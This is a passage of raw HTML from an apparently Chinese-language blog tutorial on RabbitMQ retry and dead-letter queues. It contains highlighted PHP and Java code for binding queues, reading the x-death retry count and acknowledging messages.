class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">queue_bind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">retryQueueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master.retry'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca70f099852072-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">queue_bind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">failedQueueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master.failed'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>在RabbitMQ的管理界面中，我们可以看到该队列与Exchange和routing-key的绑定关系</p>\n<p><img title=\"-w361\" src=\"https://segmentfault.com/img/remote/1460000014847797\" alt=\"-w361\"></p>\n<p><img title=\"-w405\" src=\"https://segmentfault.com/img/remote/1460000014847798\" alt=\"-w405\"></p>\n<p><img title=\"-w399\" src=\"https://segmentfault.com/img/remote/1460000014847799\" alt=\"-w399\"></p>\n<h4>消息消费实现</h4>\n<p>使用 <code>basic_consume</code> 对消息进行消费的时候，需要注意下面参数</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>queue</td>\n<td>–</td>\n<td>消费的队列名称</td>\n</tr>\n<tr>\n<td>consumer-tag</td>\n<td>–</td>\n<td>消费者标识，留空即可</td>\n</tr>\n<tr>\n<td>no_local</td>\n<td>false</td>\n<td>如果设置了该字段，服务器将不会发布消息到 发布它的客户端</td>\n</tr>\n<tr>\n<td>no_ack</td>\n<td>false</td>\n<td>需要消费确认应答</td>\n</tr>\n<tr>\n<td>exclusive</td>\n<td>false</td>\n<td>排他访问，设置后只允许当前消费者访问该队列</td>\n</tr>\n<tr>\n<td>nowait</td>\n<td>false</td>\n<td>该方法需要应答确认</td>\n</tr>\n</tbody>\n</table>\n<p>消费端在消费消息时，需要从消息中获取消息被消费的次数，以此判断该消息处理失败时重试还是发送到失败队列。</p>\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca713556405337\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nprotected Long getRetryCount(AMQP.BasicProperties properties) {\r\n    Long retryCount = 0L;\r\n    try {\r\n        Map headers = properties.getHeaders();\r\n        if (headers != null) {\r\n            if (headers.containsKey(\"x-death\")) {\r\n                List\r\n\r\n\r\n\r\n&lt;map&gt;&gt; deaths = (List\r\n\r\n\r\n\r\n&lt;map&gt;&gt;) headers.get(\"x-death\");\r\n                if (deaths.size() &gt; 0) {\r\n                    Map death = deaths.get(0);\r\n                    retryCount = (Long) death.get(\"count\");\r\n                }\r\n            }\r\n        }\r\n    } catch (Exception e) {}\r\n\r\n    return retryCount;\r\n}&lt;/map&gt;\r\n \r\n\r\n\r\n&lt;/map&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca713556405337-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca713556405337-29\">29</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-1\"><span class=\"crayon-m\">protected</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getRetryCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">AMQP</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">BasicProperties </span><span class=\"crayon-v\">properties</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">Long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">retryCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0L</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">Map </span><span class=\"crayon-v\">headers</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">properties</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getHeaders</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">headers</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-6\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">headers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">containsKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"x-death\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-7\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">List</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-8\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-11\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">map</span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">deaths</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">List</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-12\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-14\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-15\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">map</span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">headers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"x-death\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-16\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">deaths</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">size</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-17\"><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">Map </span><span class=\"crayon-v\">death</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">deaths</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-18\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">retryCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">death</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"count\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-19\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-20\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">Exception</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">retryCount</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-25\"><span class=\"crayon-sy\">}</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">map</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-26\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-27\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca713556405337-28\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca713556405337-29\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">map</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0064 seconds] -->\r\n<p> </p>\n<p> </p>\n<p> </p>\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca721779807881\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nprotected function getRetryCount(AMQPMessage $msg): int\r\n{\r\n    $retry = 0;\r\n    if ($msg-&gt;has('application_headers')) {\r\n        $headers = $msg-&gt;get('application_headers')-&gt;getNativeData();\r\n        if (isset($headers['x-death'][0]['count'])) {\r\n            $retry = $headers['x-death'][0]['count'];\r\n        }\r\n    }\r\n\r\n    return (int)$retry;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca721779807881-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca721779807881-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca721779807881-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca721779807881-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca721779807881-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca721779807881-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca721779807881-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca721779807881-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca721779807881-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca721779807881-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca721779807881-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca721779807881-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca721779807881-1\"><span class=\"crayon-m\">protected</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getRetryCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">AMQPMessage</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca721779807881-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca721779807881-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">retry</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca721779807881-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">has</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'application_headers'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca721779807881-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">headers</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'application_headers'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">getNativeData</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca721779807881-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">isset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">headers</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'x-death'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'count'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca721779807881-7\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">retry</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">headers</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'x-death'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'count'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca721779807881-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca721779807881-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca721779807881-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca721779807881-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">retry</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca721779807881-12\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p>消息消费完成后，需要发送消费确认消息给服务端，使用<code>basic_ack</code>方法</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca727301850816\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nack(delivery-tag=消息的delivery-tag标识)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca727301850816-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca727301850816-1\"><span class=\"crayon-e\">ack</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">delivery</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tag</span><span class=\"crayon-o\">=</span>消息的<span class=\"crayon-v\">delivery</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">tag</span>标识<span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca72a242750102\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div 